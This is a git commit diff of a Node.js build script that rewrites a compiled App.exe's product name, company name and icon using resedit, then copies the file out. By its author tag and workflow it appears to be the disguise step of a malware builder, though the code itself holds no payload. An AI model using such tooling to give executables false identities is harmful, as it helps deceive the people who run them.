61f0f2b2941aebac289335eb38b22da3c42290dc
Doenerium <145469894+doenerium6969@users.noreply.github.com>
2024-09-11 03:14:09 +0200

    Update ressources.mjs

--- build/ressources.mjs
+++ build/ressources.mjs
@@ -1,65 +1,100 @@
 import resedit from 'resedit-cli';
-import { resolve } from 'path';
-import readline from 'readline';
-import colors from  'colors';
+import { resolve, dirname, join } from 'path';
+import colors from 'colors';
 import { unlink, copyFile } from 'fs/promises';
 import { exec } from 'child_process';
+import inquirer from 'inquirer';
+
+// Get the directory of the currently running script
+const scriptDir = dirname(resolve('./ressources.mjs'));  
+const iconDir = resolve(scriptDir, '..', 'icon');
 
 process.stdout.write('\x1b]2;Ressources editor made by t.me/doenerium69\x07');
 
-const rl = readline.createInterface({
-  input: process.stdin,
-  output: process.stdout
-});
-
-const inputPath = resolve('./app.exe');
-const outputPath = resolve('./MyApp.exe');
+const inputPath = resolve('./App.exe');
+const outputPath = resolve('./App.exe');
 
 const options = {};
 console.log('');
-rl.question('  '.white + '['.white + '?'.blue + ']'.white + ' Enter the product name >>>', (productName) => {
-  options.in = inputPath;
-  options.out = outputPath;
-  options.definition = {
-    lang: 1033,
-    version: {
-      productName: productName,
-      fileversion: '0.0.0.0',
-      companyName: 'MyCompany'
-    }
-  };
 
-  rl.question('  '.white + '['.white + '?'.blue + ']'.white + ' Enter the Authors >>>', (companyName) => {
-    options['company-name'] = companyName;
+async function selectFile(initialDir = '') {
+  return new Promise((resolve, reject) => {
+    const isWin = process.platform === 'win32';
+    const command = isWin 
+      ? `powershell.exe -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.windows.forms') | Out-Null; $ofd = New-Object System.Windows.Forms.OpenFileDialog; $ofd.Filter = 'Icon files (*.ico)|*.ico'; $ofd.InitialDirectory = '${initialDir}'; $ofd.ShowHelp = $true; $ofd.ShowDialog() | Out-Null; $ofd.FileName"`
+      : `zenity --file-selection --file-filter="*.ico" --filename="${initialDir}"`;
 
-    rl.question('  '.white + '['.white + '?'.blue + ']'.white + ' [Slide here] Enter the path to the icon (leave empty if none) >>>', (iconPath) => {
-      options.icon = iconPath ? [`1,${resolve(iconPath)}`] : undefined;
-      
-      rl.close();
-
-      resedit(options)
-        .then(() => {
-          console.log('Resource edited successfully');
-          const sourcePath = resolve('./MyApp.exe');
-          const destinationPath = resolve('../rename_me.exe');
-          return copyFile(sourcePath, destinationPath);
-        })
-        .then(() => {
-          console.log('File copied successfully!');
-          return unlink(inputPath);
-        })
-        .then(() => {
-          console.log('Original file deleted successfully');
-          return unlink(outputPath);
-        })
-        .then(() => console.log(''))
-        .catch(err => console.error('Error:', err))
-        .finally(() => {
-          setTimeout(() => {
-            console.log('Exiting...');
-            process.exit(0);
-          }, 2000);
-        });
+    exec(command, (error, stdout, stderr) => {
+      if (error) {
+        reject(stderr);
+      } else {
+        resolve(stdout.trim());
+      }
     });
   });
-});
+}
+
+async function main() {
+  try {
+    const { productName } = await inquirer.prompt([
+      {
+        type: 'input',
+        name: 'productName',
+        message: 'Enter the product name >>>',
+      }
+    ]);
+
+    options.in = inputPath;
+    options.out = outputPath;
+    options.definition = {
+      lang: 1033,
+      version: {
+        productName: productName,
+        fileversion: '0.0.0.0',
+        companyName: 'MyCompany'
+      }
+    };
+
+    const { companyName } = await inquirer.prompt([
+      {
+        type: 'input',
+        name: 'companyName',
+        message: 'Enter the Authors >>>',
+      }
+    ]);
+
+    options['company-name'] = companyName;
+
+    const { changeIcon } = await inquirer.prompt([
+      {
+        type: 'confirm',
+        name: 'changeIcon',
+        message: 'Do you want to change the icon? (yes/no) >>>',
+        default: false
+      }
+    ]);
+
+    if (changeIcon) {
+      const iconPath = await selectFile(iconDir);  // Use the calculated icon directory as initial path
+      if (iconPath) {
+        options.icon = [`1,${resolve(iconPath)}`];
+      }
+    }
+
+    await resedit(options);
+    console.log('Resource edited successfully');
+    const sourcePath = resolve('./App.exe');
+    const destinationPath = resolve('../App.exe');
+    await copyFile(sourcePath, destinationPath);
+    await unlink(inputPath);
+  } catch (err) {
+    console.error('Error:', err);
+  } finally {
+    setTimeout(() => {
+      console.log('Exiting...');
+      process.exit(0);
+    }, 2000);
+  }
+}
+
+main();
